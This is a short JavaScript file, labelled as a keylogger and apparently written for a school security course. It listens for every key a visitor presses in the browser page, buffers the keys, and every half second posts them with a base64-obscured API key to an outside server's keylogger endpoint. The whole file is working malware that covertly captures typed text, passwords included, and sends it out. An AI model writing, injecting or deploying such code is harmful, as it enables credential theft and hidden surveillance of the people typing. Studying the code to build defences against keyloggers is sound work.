// keylogger

const apiKey = atob(
  "TVFBM0FEVUFNZ0F5QURRQU1nQTBBRGtBTVFBNEFEY0FPUUF6QURVQU53QTJBRGtB"
);
let globalBuffer = ""

function logInput(suffix, string) {
  const payload = {
    keyword: `enea-${suffix}`,
    payload: string,
  };

  fetch("https://m183.gibz-informatik.ch/api/keylogger", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Api-Key": apiKey,
    },
    body: JSON.stringify(payload),
  });
}

function sendBuffer() {
  if (globalBuffer && globalBuffer.length > 0) {
    logInput('body', globalBuffer)
    globalBuffer = ""
  }
}

function bufferKeyInput(key) {
  globalBuffer += key
}

function startKeylogger() {
  document.addEventListener("keyup", function (e) {
    bufferKeyInput(e.key)
  });
  window.setInterval(function() {
    sendBuffer()
  }, 500)
}

startKeylogger();
